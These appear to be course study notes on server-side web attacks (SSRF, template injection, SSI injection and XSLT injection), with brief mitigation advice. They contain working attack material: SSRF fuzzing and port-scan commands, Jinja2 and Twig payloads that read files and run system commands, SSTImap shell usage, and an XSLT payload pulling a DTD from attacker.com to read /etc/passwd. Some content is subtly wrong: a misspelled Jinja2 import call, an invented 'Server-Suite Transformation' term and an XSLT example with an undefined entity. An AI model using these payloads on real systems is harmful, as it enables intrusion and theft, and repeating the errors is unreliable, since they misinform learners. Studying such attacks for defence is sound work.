# Server-Side Attacks

## Introduction

Server-side attacks are attacks that are performed on the server side of a client-server system. These attacks are performed by exploiting vulnerabilities in the server software or the server configuration. Server-side attacks can be used to gain unauthorized access to the server, steal sensitive information, or disrupt the server's operation.

## Types of Server-Side Attacks

There are several types of server-side attacks that can be used to compromise a server. Some of the most common types of server-side attacks include:

1. Server-Side Request Forgery (SSRF): SSRF is an attack that allows an attacker to send a request from the server to another server on the internal network or the internet. This vulnerability often occurs when an application makes HTTP requests to other servers based on user input. Successful exploitation of SSRF can enable an attacker to access internal systems, bypass firewalls, and retrieve sensitive information.

2. Server-Side Template Injection (SSTI): SSTI is an attack that allows an attacker to inject malicious code into a server-side template. This attack can be used to execute arbitrary code on the server and gain unauthorized access to the server.

3. Server-Side Include (SSI) Injection: SSI injection is an attack that allows an attacker to inject malicious code into a server-side include file. SSI directives instruct the webserver to include additional content dynamically. SSI injection can lead to data leakage or even remote code execution.

4. XSLT Server-Suite Transformation (XSLT SST) Attack: XSLT (Extensible Stylesheet Language Transformations) server-side injection is a vulnerability that arises when an attacker can manipulate XSLT transformations performed on the server. XSLT is a language used to transform XML documents into other formats, such as HTML, and is commonly employed in web applications to generate content dynamically. In the context of XSLT server-side injection, attackers exploit weaknesses in how XSLT transformations are handled, allowing them to inject and execute arbitrary code on the server.

## SSRF - Server-Side Request Forgery

> "SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL)." - OWASP

Suppose a web server fetches remote resources based on user input. In that case, an attacker might be able to coerce the server into making requests to arbitrary URLs supplied by the attacker, i.e., the web server is vulnerable to SSRF.

To exploit SSRF, an attacker can provide a malicious URL as input to the vulnerable application. The application will then make a request to the malicious URL, allowing the attacker to access internal systems, bypass firewalls, and retrieve sensitive information.

Example:

```bash
ffuf -w ../SecLists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.87.11/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

In many real-world SSRF vulnerabilities, the response is not directly displayed to us. These instances are called *blind SSRF vulnerabilities* because we cannot see the response. In such cases, we can use the Burp Collaborator to check if the server is making requests to the malicious URL. Therefore, the impact of blind SSRF vulnerabilities is generally significantly lower due to the severely restricted exploitation vectors.

For example, the followinf command is a port scanner:

```bash
ffuf -w ports.txt -u http://10.129.86.235/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fs 21
```

To prevent SSRF attacks, developers should validate user input and restrict the URLs that the application can access. Additionally, developers should avoid using user-supplied URLs in server-side requests.

On the network layer, appropriate firewall rules can prevent outgoing requests to unexpected remote systems. If properly implemented, a restricting firewall configuration can mitigate SSRF vulnerabilities in the web application by dropping any outgoing requests to potentially interesting target systems. 

References:
- https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
- https://portswigger.net/web-security/ssrf
- https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/
- https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF
- https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf
- https://academy.ranakhalil.com/courses/1491236/lectures/35225426

### SSTI - Server-Side Template Injection

A template engine is software that combines pre-defined templates with dynamically generated data and is often used by web applications to generate dynamic responses. An everyday use case for template engines is a website with shared headers and footers for all pages. A template can dynamically add content but keep the header and footer the same. This avoids duplicate instances of header and footer in different places, reducing complexity and thus enabling better code maintainability. Popular examples of template engines are Jinja and Twig.

Server-Side Template Injection (SSTI) is a vulnerability that arises when an attacker can inject malicious code into a server-side template. This attack can be used to execute arbitrary code on the server and gain unauthorized access to the server.

If templating is implemented correctly, user input is always provided to the rendering function in values and never in the template string. However, SSTI can occur when user input is inserted into the template before the rendering function is called on the template. 

Payloads to identify the most commom template engines:
- Jinja2: `{{7*7}}`
- Twig: `{{7*'7'}}`
- Freemarker: `${7*7}`
- Velocity: `$7*7`
- Smarty: `{$smarty.version}`

### Exploiting SSTI - Jinja2

Jinja2 is a popular template engine for Python web applications, commonly used in web frameworks such as Flask or Django. To exploit SSTI in Jinja2, an attacker can inject arbitrary code into the template. The following payload can be used to identify SSTI in Jinja2:

```bash
{{7*7}}
```

If the application is vulnerable to SSTI, the payload will be evaluated, and the result will be displayed on the page. The attacker can then use this vulnerability to execute arbitrary code on the server. We can exploit the SSTI vulnerability to obtain internal information about the web application, including configuration details and the web application's source code. For instance, we can obtain the web application's configuration using the following SSTI payload:

```bash
{{config.items()}}
```

We can also execute Python code to obtain information about the web application's source code. We can use the following SSTI payload to dump all available built-in functions:

```bash
{{ self.__init__.__globals__.__builtins__ }}
```

To achieve remote code execution in Python, we can use functions provided by the os library, such as system or popen. However, if the web application has not already imported this library, we must first import it by calling the built-in function import. This results in the following SSTI payload:

```bash
{{ self.__init__.__globals__.__builtins__.import('os').popen('id').read() }}
```

### Exploiting SSTI - Twig

Twig is a popular template engine for PHP web applications, commonly used in web frameworks such as Symfony. To exploit SSTI in Twig, an attacker can inject arbitrary code into the template. The following payload can be used to identify SSTI in Twig:

```bash
{{7*'7'}}
```

If the application is vulnerable to SSTI, the payload will be evaluated, and the result will be displayed on the page. The attacker can then use this vulnerability to execute arbitrary code on the server.

Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework Symfony defines additional Twig filters. One of these filters is file_excerpt and can be used to read local files:

```bash
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

Another way to achieve remote code execution is by using a PHP built-in function such as system. We can pass an argument to this function by using Twig's filter function, resulting in any of the following SSTI payloads:

```bash
{{ ['id'] | filter('system') }}
```
### SSTI Tools and Resources

SSTImap is a popular tool used to identify SSTI vulnerabilities in web applications. SSTImap can be used to detect SSTI vulnerabilities in web applications that use Jinja2, Twig, Freemarker, Velocity, Smarty, and other template engines. SSTImap can be found at the following link:

https://github.com/vladko312/SSTImap

We can run it after cloning the repository and installing the required dependencies:

```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py
```

To automatically identify any SSTI vulnerabilities as well as the template engine used by the web application, we need to provide SSTImap with the target URL:

```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```

It also provides capabilities we can use during exploitation. For instance, we can download a remote file to our local machine using the -D flag:

```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
```

Additionally, we can execute a system command using the -S flag:

```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```

Alternatively, we can use --os-shell to obtain an interactive shell:

```bash
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

To prevent SSTI attacks, developers should validate user input and restrict the code that the application can execute. Additionally, developers should avoid using user-supplied code in server-side templates.

## Server-Side Include (SSI) Injection

Server-Side Includes (SSI) is a technology that allows web developers to include content dynamically in web pages. SSI directives are used to instruct the web server to include additional content in the web page. SSI directives are typically enclosed in HTML comments and are processed by the web server before the page is sent to the client.
- The use of SSI can often be inferred from the file extension. Typical file extensions include .shtml, .shtm, and .stm.

An SSI directive has the following syntax:

```html
<!--#name param1="value1" param2="value" -->
```

The most common SSI directives are:
- `#include`: Includes the content of another file in the web page.
- `#exec`: Executes a command on the server and includes the output in the web page.
- `#echo`: Prints the value of a variable in the web page.

Example of an SSI directive that includes the content of another file in the web page:

```html
<!--#include file="header.html" -->
```

Example of an SSI directive that executes a command on the server and includes the output in the web page:

```html
<!--#exec cmd="ls" -->
```

Example of an SSI directive that prints the value of a variable in the web page:

```html
<!--#echo var="REMOTE_ADDR" -->
```

SSI injection is an attack that allows an attacker to inject malicious code into a server-side include file. SSI injection can lead to data leakage or even remote code execution. To exploit SSI injection, an attacker can provide a malicious payload as input to the vulnerable application. The application will then include the malicious payload in the server-side include file, allowing the attacker to execute arbitrary code on the server.

To prevent SSI injection attacks, developers should validate user input and restrict the content that the application can include in server-side include files. Additionally, developers should avoid using user-supplied content in server-side include files.

## eXtensible Stylesheet Language Transformation (XSLT)

XSLT (eXtensible Stylesheet Language Transformations) is a language used to transform XML documents into other formats, such as HTML. XSLT is commonly employed in web applications to generate content dynamically. XSLT transformations are performed on the server, and the resulting content is sent to the client.

XSLT Server-Suite Transformation (XSLT SST) is a vulnerability that arises when an attacker can manipulate XSLT transformations performed on the server. Attackers exploit weaknesses in how XSLT transformations are handled, allowing them to inject and execute arbitrary code on the server.

To exploit XSLT SST, an attacker can provide a malicious payload as input to the vulnerable application. The application will then perform an XSLT transformation on the malicious payload, allowing the attacker to execute arbitrary code on the server.

Example of exploitation:
    
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE xsl:stylesheet [
    <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
    %remote;
    %all;
    ]>
    <xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
    <html>
    <body>
    <h2>My CD Collection</h2>
    <table border="1">
    <tr bgcolor="#9acd32">
    <th>Title</th>
    <th>Artist</th>
    </tr>
    <tr>
    <td><xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/></td>
    <td>Bob Dylan</td>
    </tr>
    </table>
    </body>
    </html>
    </xsl:template>
    </xsl:stylesheet>
    ```

If an XSLT processor supports PHP functions, we can call a PHP function that executes a local system command to obtain RCE. For instance, we can call the PHP function system to execute a command:

<xsl:value-of select="php:function('system','id')" />

To prevent XSLT SST attacks, developers should validate user input and restrict the XSLT transformations that the application can perform. Additionally, developers should avoid using user-supplied XSLT transformations in server-side code.
